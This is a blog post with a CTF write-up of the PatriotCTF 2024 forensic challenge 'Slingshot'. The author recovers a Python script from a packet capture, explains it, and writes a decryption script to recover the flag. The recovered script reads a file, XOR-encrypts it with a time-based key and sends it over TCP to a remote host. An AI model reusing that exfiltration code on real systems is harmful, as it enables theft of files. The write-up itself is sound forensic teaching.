---
title: 'PATRIOT CTF 2024'
date: 2024-09-22
permalink: /posts/2024/09/patriotctf/
tags:
  - web
  - osint
  - misc
  - forensic
---

Introduction
=====
<div style="text-align: center; size: 50px">
  <img src="/images/patriotctf2024/pctf-cert.png" alt="PATRIOTCTF2024" />
</div>
<br>
PatriotCTF is a beginner-friendly capture-the-flag competition hosted by GMU's cybersecurity club, MasonCC. All are welcome to participate, including students and security professionals. Challenges will range from beginner to expert, so there should be something for everyone. This is a jeopardy-style CTF, meaning there will be various challenges from the different categories described below. 


# Forensic
* **Slingshot**
> <span style="color:pink">Author: AJ Hoepfner (greatvaluerice)</span>

    Description:
    <div style="text-align: center;">
        <img src="/workspaces/NguyenCongHaiNam.github.io/images/patriotctf2024/for/Slingshot/description.png" alt="Challenge" />
    </div>
    <br>
    
    The challenge gives us a `.pcapng` file. Let's analyze it! The first, I check *Protocol Hierarchy Statistics*. 
    <div style="text-align: center;">
        <img src="/workspaces/NguyenCongHaiNam.github.io/images/patriotctf2024/for/Slingshot/hierarchy.png" alt="hierarchy" />
    </div>
    <br>

    It showed 100% of the packet is TCP, so I filtered HTTP first.
    <div style="text-align: center;">
        <img src="/workspaces/NguyenCongHaiNam.github.io/images/patriotctf2024/for/Slingshot/http-fil.png" alt="" />
    </div>
    <br>
    
    Then, i export this `.pyc` file and uncompiled it. I got the `.py` with content:
    ```
    import sys
    import socket
    import time
    import math
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    file = sys.argv[1]
    ip = sys.argv[2]
    port = 22993
    with open(file, 'rb') as r:
        data_bytes = r.read()
    current_time = time.time()
    current_time = math.floor(current_time)
    key_bytes = str(current_time).encode('utf-8')
    init_key_len = len(key_bytes)
    data_bytes_len = len(data_bytes)
    temp1 = data_bytes_len // init_key_len
    temp2 = data_bytes_len % init_key_len
    key_bytes *= temp1
    key_bytes += key_bytes[:temp2]
    encrypt_bytes = bytes((a ^ b for a, b in zip(key_bytes, data_bytes)))
    s.connect((ip, port))
    s.send(encrypt_bytes)
    ```
    The code opens the secret file in binary read mode `('rb')` and reads its contents into a byte string `data_bytes`.

    The current time is obtained using time.time() and converted to an integer using math.floor(). This integer is then converted to a byte string `key_bytes` using the encode() method with the 'utf-8' encoding.
    
    The code calculates the length of the key `init_key_len` and the length of the data `data_bytes_len`. It then calculates the number of times the key needs to be repeated to match the length of the data `temp1` and the remaining bytes `temp2`.

    The key is repeated `temp1` times and then padded with the first `temp2` bytes of the key to match the length of the data. 
    
    Then the code uses a generator expression to perform a byte-wise XOR operation between the key and the data, resulting in an encrypted byte string `encrypt_bytes`. Finally send it to some ip with port `22993`.
    
    Continuously, i filtered the packet with port `22993` and have `data`
    <div style="text-align: center;">
        <img src="/workspaces/NguyenCongHaiNam.github.io/images/patriotctf2024/for/Slingshot/filter.png" alt="" />
    </div>
    <br>
    
    Nice, i found 3 packets was send. So let's extract all of them by using this command:
    > tshark -r Slingshot.pcapng -Y 'tcp.port ==22993 and data and data.len!=1' -T fields -e data > data.enc
    
    Next step is find timestamp or key. It is the epoch time when the first packet send.
    <div style="text-align: center;">
        <img src="/workspaces/NguyenCongHaiNam.github.io/images/patriotctf2024/for/Slingshot/time.png" alt="" />
    </div>
    <br>
    
    Nice, i got all things to decrypt the flag. Here is my code:
    ```
    from datetime import datetime
    import math
    
    with open("data.enc") as f:
        total_hex = "".join([line.strip() for line in f.readlines()])
    encrypted_bytes = bytes.fromhex(total_hex)
    
    current_time = 1726595769.063377000
    current_time = math.floor(current_time)
    
    key_bytes = str(current_time).encode('utf-8')
    init_key_len = len(key_bytes)
    data_bytes_len = len(encrypted_bytes)
    temp1 = data_bytes_len // init_key_len
    temp2 = data_bytes_len % init_key_len
    key_bytes *= temp1
    key_bytes += key_bytes[:temp2]
    
    decrypted_bytes = bytes(a ^ b for a, b in zip(key_bytes, encrypted_bytes))
    image_filename = 'decrypted_image.jpg'
    
    with open(image_filename, 'wb') as f:
        f.write(decrypted_bytes)
    
    print("Done")
    ```
    
    
    Flag:
    <div style="text-align: center;">
        <img src="/workspaces/NguyenCongHaiNam.github.io/_posts/2024-09-23-patriotctf.md" alt="" />
    </div>
    <br>
    
    ### Conslusion:
    + Export the encrypt code
    + Filter to extract data and timestamp
    + Decrypt flag

    # Updating...